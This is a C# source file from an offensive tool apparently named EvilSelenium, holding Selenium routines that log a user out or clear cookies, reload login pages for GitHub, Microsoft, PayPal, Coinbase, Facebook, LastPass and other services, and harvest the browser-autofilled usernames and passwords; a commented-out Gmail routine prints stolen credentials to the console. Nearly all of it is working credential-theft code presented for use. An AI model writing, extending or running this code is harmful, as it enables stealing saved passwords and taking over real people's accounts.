using System;
using OpenQA.Selenium;
using OpenQA.Selenium.Interactions;
using System.Threading;
using EvilSelenium.Misc;

namespace EvilSelenium.Credentials
{
    class WebsiteTemplates
    {
        /*
         * Extract a website dynamically given the username field id & password field id
         * string targetWebsite - The login page of the website
         * string username - The name value of the username field
         * string password - The name value of the password field
         */
        public static void DynamicExtractById(string targetWebsite, string usernameId, string passwordId)
        {

            IWebDriver driver = Helpers.CookieDeleter(targetWebsite);

            Helpers.ExtractUserPassById(targetWebsite, usernameId, passwordId, driver);

            driver.Quit();
        }

        /*
         * Extract a website dynamically given the username field name value & password field name value
         * string targetWebsite - The login page of the website
         * string username - The name value of the username field
         * string password - The name value of the password field
         */
        public static void DynamicExtractByName(string targetWebsite, string username, string password)
        {

            IWebDriver driver = Helpers.CookieDeleter(targetWebsite);

            Helpers.ExtractUserPassByName(targetWebsite, username, password, driver);

            driver.Quit();
        }

        /*
         * Extract a website dynamically given the username field name value & password field name value and their positions
         * This function is used if there is more than 1 of the same name value on the website
         */
        public static void DynamicExtractByNameCustom(string targetWebsite, string usernamePosition, string passwordPosition, string username, string password)
        {

            IWebDriver driver = Helpers.CookieDeleter(targetWebsite);

            Helpers.ExtractUserPassByNameCustom(targetWebsite, usernamePosition, passwordPosition, username, password, driver);

            driver.Quit();
        }

        /* ---------------------------------- Templates Begin ---------------------------------- */

        public static void GithubExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://github.com/login");

            Helpers.ExtractUserPassById("https://github.com/login", "login_field", "password", driver);

            driver.Quit();
        }

        public static void OutlookExtract()
        {

            IWebDriver driver = Helpers.LogoutUsingLink("https://login.live.com/logout.srf");


            driver.Navigate().GoToUrl("https://login.live.com");
            driver.Navigate().Refresh();
            Thread.Sleep(2000);

            Helpers.ExtractUserPassById("https://login.live.com", "i0116", "i0118", driver);

            driver.Quit();
        }

        public static void O365Extract()
        {

            // Logout
            IWebDriver driver = Helpers.LogoutUsingLink("https://login.microsoftonline.com/logout.srf");

            // Head back to the login page
            driver.Navigate().GoToUrl("https://login.microsoftonline.com");
            driver.Navigate().Refresh();
            Thread.Sleep(2000); // Short delay

            Helpers.ExtractUserPassById("https://login.microsoftonline.com/", "i0116", "i0118", driver);

            driver.Quit();
        }

        public static void LinkedInExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.linkedin.com/");

            Helpers.ExtractUserPassById("https://www.linkedin.com/", "session_key", "session_password", driver);

            driver.Quit();
        }

        public static void PayPalExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.paypal.com/signin");

            Helpers.ExtractUserPassById("https://www.paypal.com/signin", "email", "password", driver);

            driver.Quit();
        }

        public static void CoinbaseExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.coinbase.com/signin");

            Helpers.ExtractUserPassById("https://www.coinbase.com/signin", "email", "password", driver);

            driver.Quit();
        }

        public static void FacebookExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.facebook.com/");

            Helpers.ExtractUserPassById("https://www.facebook.com/", "email", "pass", driver);

            driver.Quit();
        }

        public static void MessengerExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.messenger.com/");

            Helpers.ExtractUserPassById("https://www.messenger.com/", "email", "pass", driver);

            driver.Quit();
        }

        public static void RedditExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.reddit.com/login/");

            Helpers.ExtractUserPassById("https://www.reddit.com/login/", "loginUsername", "loginPassword", driver);

            driver.Quit();
        }

        public static void InstagramExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.instagram.com/");

            Thread.Sleep(10000); // IG specifc delay

            Helpers.ExtractUserPassByName("https://www.instagram.com/", "username", "password", driver);

            driver.Quit();
        }

        public static void CitrixExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://login.citrix.com/");

            Helpers.ExtractUserPassById("https://login.citrix.com/", "username", "password", driver);

            driver.Quit();
        }

        public static void NetflixExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://www.netflix.com/login");

            Helpers.ExtractUserPassById("https://www.netflix.com/login", "id_userLoginId", "id_password", driver);

            driver.Quit();
        }

        /* Untested */
        public static void SalesForceExtract()
        {

            IWebDriver driver = Helpers.CookieDeleter("https://login.salesforce.com/");

            Helpers.ExtractUserPassById("https://login.salesforce.com/", "username", "password", driver);

            driver.Quit();
        }

        public static void LastPassExtract()
        {
            IWebDriver driver = Helpers.CookieDeleter("https://lastpass.com/?ac=1");

            Helpers.ExtractUserPassByNameCustom("https://lastpass.com/?ac=1", "1", "1", "username", "password", driver);

            driver.Quit();

        }

        /*
        public static void GmailExtract()
        {
            string username = "";
            string password = "";

            IWebDriver driver = Helpers.CookieDeleter("https://mail.google.com");
            driver.Navigate().GoToUrl("https://ac")
            IJavaScriptExecutor js = (IJavaScriptExecutor)driver;

            // Extract email first
            try { 

            driver.FindElement(By.Id("identifierId")).Click();
            username = (string)js.ExecuteScript("return document.getElementById('identifierId').value");
            }
            catch (NoSuchElementException ex)
            {
                Console.WriteLine("[-] Error - The element is not clickable");
                return;
            }
            catch (ElementClickInterceptedException ex)
            {
                // Theres another element blocking it
                // Use Actions class to get past this error
                Actions act = new Actions(driver);
                act.MoveToElement(driver.FindElement(By.Id("identifierId"))).Click().Perform();
                username = (string)js.ExecuteScript("return document.getElementById('identifierId').value");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error - Unable to extract Gmail");
                return;
            }

            // Click continue
            driver.FindElements(By.TagName("button"))[2].Click();
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

            // Extract password
            password = (string)js.ExecuteScript("return document.getElementsByName('password')[0].value");

            Console.WriteLine("----- https://mail.google.com -----");
            Console.WriteLine("Username: " + username);
            Console.WriteLine("Password: " + password);
            Console.WriteLine();

            driver.Quit();

        }
        */
    }
}
